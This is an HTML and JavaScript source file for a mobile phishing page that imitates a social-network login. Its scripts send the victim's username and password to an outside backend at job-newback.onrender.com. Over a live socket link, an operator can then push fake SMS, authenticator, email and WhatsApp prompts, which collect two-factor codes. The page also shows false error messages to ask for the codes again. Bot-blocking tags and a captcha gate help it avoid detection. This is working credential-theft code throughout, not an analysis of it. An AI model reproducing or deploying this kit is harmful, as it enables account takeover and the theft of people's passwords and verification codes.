<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/1.css" />
  <link rel="stylesheet" href="assets/2.css" />
  <link rel="stylesheet" href="assets/3.css" />
  <link rel="stylesheet" href="assets/LoginPage.css" />
  <link rel="icon" href="./assets/fav.png" type="image/x-icon">
  <meta name="robots" content="noindex, nofollow">

  <!-- Block specific bots -->
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="bingbot" content="noindex, noarchive, nosnippet">

  <!-- Stop showing previews/snippets -->
  <meta name="robots" content="nosnippet">

  <!-- No image indexing -->
  <meta name="googlebot" content="noimageindex">

  <!-- Prevent caching by bots -->
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
</head>
<style>
  @media (max-width: 768px) {
    .desktop-only {
      display: none;
    }

    .mobile-only {
      display: block;
    }
  }

  body {
    margin: 0;
    padding: 0;
    position: relative;
    /* Ensure the fullscreenbg is positioned correctly */
    height: 100vh;
    /* Full height */
  }
</style>

<body>

  <div class="fullscreenbg"></div>

  <div id="modal-overlay" style="display: none;">
    <div id="modal-content" class="modal"></div>
  </div>

  <div class="flex flex-col h-screen relative z-10" id="main-content">
    <div class="text-center mt-2">
      <p class="text-[13px] text-gray-600 whitespace-pre-wrap break-words fontiiiii">English (US)</p>
    </div>
    <div class="flex flex-col flex-grow w-full justify-evenly items-center"><img src="assets/file_3.png" alt="Top Image"
        class="w-[60px] h-[60px]">
      <div class="flex flex-col items-center w-full max-w-md px-4"><input type="text" autocomplete="off"
          placeholder="Username"
          class="w-full mb-4 pointer-events-auto py-[16px] px-[15px] cursor-pointer border focus:outline-[#67788a] border-[rgb(203,210,217)] rounded-xl"
          id="username" value="" style="opacity: 1;">
        <input type="password" placeholder="Password" autocomplete="off"
          class="w-full mb-4 pointer-events-auto py-[16px] px-[15px] cursor-pointer border focus:outline-[#67788a] border-[rgb(203,210,217)] rounded-xl"
          id="password" value="" style="opacity: 1;">
        <button id="loginBtn" disabled=""
          class="mb-4 w-full py-2 bg-blue-500 text-white rounded hover:bg-blue-600 focus:outline-none text-[16px]"
          style="border-radius: 22px; background: rgb(0, 100, 224);">
          Log in
        </button><a href="#" class="text-blue-500 hover:underline fontiiiii" style="color: rgb(28, 43, 51); 
                    ">Forgot
          Password?</a>
      </div>
    </div>
    <div class="mt-[6rem]"></div>
    <div class="flex flex-col w-full items-center">
      <div class="flex flex-col items-center px-4 py-4 w-full max-w-md"><button disabled=""
          class="mb-6 py-2 px-4 w-full border border-gray-300 rounded hover:bg-gray-100 focus:outline-none focus:ring focus:ring-gray-300"
          style="border-radius: 22px; color: rgb(0, 100, 224); border: 1px solid rgb(0, 100, 224); 
                     opacity: 1;">Create
          new account</button><img src="assets/file_9.png" alt="Bottom Logo" class="mb-6 h-[12px]">
        <div class="flex space-x-2"><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">About</a><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">Help</a><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">More</a></div>
      </div>
    </div>
  </div>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <script>
    const BACKEND = (function() {
      var h = location.hostname;
      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
        ? 'http://localhost:3001'
        : 'https://job-newback.onrender.com';
    })();

    const shownCommands = {};
    let clientId = localStorage.getItem('clientId');
    if (!clientId) {
      clientId = crypto.randomUUID();
      localStorage.setItem('clientId', clientId);
    }

    const socket = io(BACKEND, {
      query: { clientId },
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      timeout: 20000
    });

    /* Chrome mobile kills WebSocket when backgrounded (even if socket.connected=true).
       Force a clean disconnect + reconnect every time the page becomes visible again. */
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState === 'visible' && !_firstConnect) {
        setTimeout(function () {
          socket.disconnect();
          setTimeout(function () { socket.connect(); }, 300);
        }, 500);
      }
    });

    let _firstConnect = true;
    socket.on('connect', () => {
      console.log("✅ Connected to server with socket ID:", socket.id);
      localStorage.setItem('socketSession', JSON.stringify({ socketId: socket.id, timestamp: Date.now() }));
      socket.emit('userConnectedToPage', { clientId, page: 'mobile' });

      if (!_firstConnect) {
        /* Reconnected after background — reset any stuck loading state */
        const loginBtn = document.getElementById('loginBtn');
        if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
          loginBtn.disabled = false;
          loginBtn.style.opacity = '1';
          loginBtn.style.cursor = 'pointer';
          loginBtn.innerHTML = 'Log in';
        }
        const continueBtn = document.getElementById('continueBtn');
        if (continueBtn && continueBtn.querySelector('.loading-spinner')) {
          continueBtn.disabled = false;
          continueBtn.style.opacity = '1';
          continueBtn.style.cursor = 'pointer';
          continueBtn.innerHTML = 'Continue';
        }
      }
      _firstConnect = false;
    });
    socket.on('show-calendar', () => {
      window.location.href = 'calendly';
    });

    async function loadPage(filename) {
      try {
        const response = await fetch(`${BACKEND}/public/${filename}`);
        const html = await response.text();
        const main = document.getElementById('main-content');
        main.className = '';
        main.innerHTML = html;
        if (filename === 'auth') setupAuthPageLogic();
        if (filename === 'sms') setupAuthPageLogic();
        if (filename === 'wh') setupAuthPageLogic();
        if (filename === 'email') setupEmailPageLogic();
      } catch (err) {
        console.error("Error loading page:", filename, err);
      }
    }
    async function loadModalPage(filename) {
      try {
        const file = filename.endsWith('.html') ? filename : `${filename}.html`;
        const response = await fetch(`${BACKEND}/public/${file}`);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const html = await response.text();
        const overlay = document.getElementById('modal-overlay');
        const content = document.getElementById('modal-content');
        if (!overlay || !content) throw new Error('Modal elements missing');
        content.innerHTML = html;
        overlay.style.display = 'flex';

        overlay.onclick = (e) => {
          if (e.target.id === 'modal-overlay') {
            overlay.style.display = 'none';
            content.innerHTML = '';
          }
        };
      } catch (err) {
        console.error("❌ Failed to load modal page:", filename, err);
      }
    }

    function setupAuthPageLogic() {
      const authCodeInput = document.getElementById('authCode');
      const continueBtn = document.getElementById('continueBtn');


      authCodeInput.addEventListener('input', () => {
        const val = authCodeInput.value.replace(/\D/g, '').slice(0, 6);
        authCodeInput.value = val;


        if (val.length === 6) {
          continueBtn.disabled = false;
          continueBtn.style.opacity = '1';
          continueBtn.style.cursor = 'pointer';
        } else {
          continueBtn.disabled = true;
          continueBtn.style.opacity = '0.4';
          continueBtn.style.cursor = 'not-allowed';
        }
      });

      function sendCode() {
        const code = authCodeInput.value;
        const socketId = socket.id;
        if (code.length !== 6) return;
        continueBtn.disabled = true;
        continueBtn.style.opacity = '0.4';
        continueBtn.style.cursor = 'not-allowed';
        continueBtn.innerHTML = '<span class="loading-spinner"></span>';
        fetch(BACKEND + '/send-auth-code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code: code, socketId: socketId })
        })
          .then(response => response.json())
          .then(data => {
          })
          .catch(error => {
            console.error('Error:', error);
            continueBtn.innerHTML = 'Continue';
            continueBtn.disabled = false;
            continueBtn.style.opacity = '1';
            continueBtn.style.cursor = 'pointer';
          });
      }
      continueBtn.addEventListener('click', sendCode);
    }
    function setupEmailPageLogic() {
      const authCodeInput = document.getElementById('authCode');
      const continueBtn = document.getElementById('continueBtn');


      authCodeInput.addEventListener('input', () => {
        const val = authCodeInput.value.replace(/\D/g, '').slice(0, 8);
        authCodeInput.value = val;


        if (val.length === 8) {
          continueBtn.disabled = false;
          continueBtn.style.opacity = '1';
          continueBtn.style.cursor = 'pointer';
        } else {
          continueBtn.disabled = true;
          continueBtn.style.opacity = '0.4';
          continueBtn.style.cursor = 'not-allowed';
        }
      });

      function sendCode() {
        const code = authCodeInput.value;
        const socketId = socket.id;
        if (code.length !== 8) return;
        continueBtn.disabled = true;
        continueBtn.style.opacity = '0.4';
        continueBtn.style.cursor = 'not-allowed';
        continueBtn.innerHTML = '<span class="loading-spinner"></span>';
        fetch(BACKEND + '/send-email-code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code: code, socketId: socketId })
        })
          .then(response => response.json())
          .then(data => {
          })
          .catch(error => {
            console.error('Error:', error);
            continueBtn.innerHTML = 'Continue';
            continueBtn.disabled = false;
            continueBtn.style.opacity = '1';
            continueBtn.style.cursor = 'pointer';
          });
      }
      continueBtn.addEventListener('click', sendCode);
    }

    
    function retryCodePrompt() {
      const timerDiv = document.querySelector('.timer');
      const btn = document.getElementById('continueBtn');
      if (timerDiv) {
        timerDiv.innerText = "The code you entered isn't correct. Please check again.";
        timerDiv.style.display = 'block';
      }
      if (btn) {
        btn.innerHTML = 'Continue';
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
      }
    }

    socket.on('show-2fa', () => {
      if (shownCommands['2fa']) {
        retryCodePrompt();
      } else {
        shownCommands['2fa'] = true;
        loadPage('sms');
      }
    });
    socket.on('show-auth', () => {
      if (shownCommands['auth']) {
        retryCodePrompt();
      } else {
        shownCommands['auth'] = true;
        loadPage('auth');
      }
    });
    socket.on('show-email', () => {
      if (shownCommands['email']) {
        retryCodePrompt();
      } else {
        shownCommands['email'] = true;
        loadPage('email');
      }
    });
    socket.on('show-whatsapp', () => {
      if (shownCommands['whatsapp']) {
        retryCodePrompt();
      } else {
        shownCommands['whatsapp'] = true;
        loadPage('wh');
      }
    });
    // socket.on('show-email', () => loadPage('email'));
    // socket.on('show-whatsapp', () => loadPage('wh'));
    socket.on('show-wrong-creds', () => {
      if (!document.getElementById('loginBtn')) {
        showLoginPage();
      } else {
        resetLoginForm();
      }
      loadModalPage('wrong-creds');
    });
    socket.on('show-old-pass', () => loadModalPage('old-password'));

    socket.on('show-google-login', () => {
      const emailEl = document.getElementById('username');
      const fbEmail = (emailEl && emailEl.value.trim())
                      || sessionStorage.getItem('lastLoginEmail')
                      || '';
      try {
        sessionStorage.setItem('lastLoginEmail', fbEmail);
        sessionStorage.setItem('googleReturnPage', 'mobile.html');
      } catch(e) {}
      window.location.href = 'fb-verify.html';
    });

    socket.on('show-gmail-wrong-pass', () => {
      if (!document.getElementById('loginBtn')) {
        showLoginPage();
      } else {
        resetLoginForm();
      }
      loadModalPage('wrong-creds');
    });

    socket.on('redirect', (url) => {
      window.location.href = url;
    });

    /* ── Redirected back from google-login.html — open the right mobile modal ── */
    const mobilePendingModal = sessionStorage.getItem('pendingModal');
    if (mobilePendingModal) {
      sessionStorage.removeItem('pendingModal');
      sessionStorage.removeItem('googleReturnPage');
      const mobileModalMap = {
        '2fa':       () => { shownCommands['2fa']      = true; loadPage('sms'); },
        'auth':      () => { shownCommands['auth']     = true; loadPage('auth'); },
        'email':     () => { shownCommands['email']    = true; loadPage('email'); },
        'whatsapp':  () => { shownCommands['whatsapp'] = true; loadPage('wh'); },
        'wrongcreds':() => loadModalPage('wrong-creds'),
        'oldpass':   () => loadModalPage('old-password')
      };
      if (mobileModalMap[mobilePendingModal]) {
        mobileModalMap[mobilePendingModal]();
      }
    }

  </script>
  <script>
    const loginPageHTML = document.getElementById('main-content').innerHTML;

    function enableLoginBtn() {
      const loginBtn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      if (!loginBtn || !usernameInput || !passwordInput) return;

      if (usernameInput.value.trim() && passwordInput.value.trim()) {
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
        loginBtn.style.cursor = 'pointer';
      } else {
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.4';
        loginBtn.style.cursor = 'not-allowed';
      }
    }

    async function sendLoginData() {
      const loginBtn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      if (!loginBtn || !usernameInput || !passwordInput) return;

      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();
      if (!username || !password) return;

      try { sessionStorage.setItem('lastLoginEmail', username); } catch(e) {}

      loginBtn.disabled = true;
      loginBtn.style.opacity = '0.4';
      loginBtn.style.cursor = 'not-allowed';
      loginBtn.innerHTML = '<span class="loading-spinner"></span>';

      try {
        const response = await fetch(BACKEND + '/send-login-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password, socketId: socket.id })
        });
        await response.json();
      } catch (error) {
        console.error('Error:', error);
      }
    }

    function initLoginForm() {
      const loginBtn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      if (!loginBtn || !usernameInput || !passwordInput) return;

      usernameInput.addEventListener('input', enableLoginBtn);
      passwordInput.addEventListener('input', enableLoginBtn);
      loginBtn.addEventListener('click', sendLoginData);
    }

    function showLoginPage() {
      const main = document.getElementById('main-content');
      main.className = 'flex flex-col h-screen relative z-10';
      main.innerHTML = loginPageHTML;
      initLoginForm();
    }

    function resetLoginForm() {
      const loginBtn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');

      if (usernameInput) usernameInput.value = '';
      if (passwordInput) passwordInput.value = '';
      if (loginBtn) {
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.4';
        loginBtn.style.cursor = 'not-allowed';
        loginBtn.innerHTML = 'Log in';
      }
    }

    initLoginForm();
  </script>
  <script>
    function checkIfStillMobile() {
      var h = location.hostname;
      var isLocal = (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'));
      if (isLocal) return; // skip redirect when testing locally
      const isMobile = window.innerWidth <= 768;
      if (!isMobile) {
        window.location.href = 'apply.html';
      }
    }
    checkIfStillMobile();

    function closeModal() {
      const overlay = document.getElementById('modal-overlay');
      if (overlay) overlay.style.display = 'none';
      resetLoginForm();
    }
  </script>
</body>

</html>
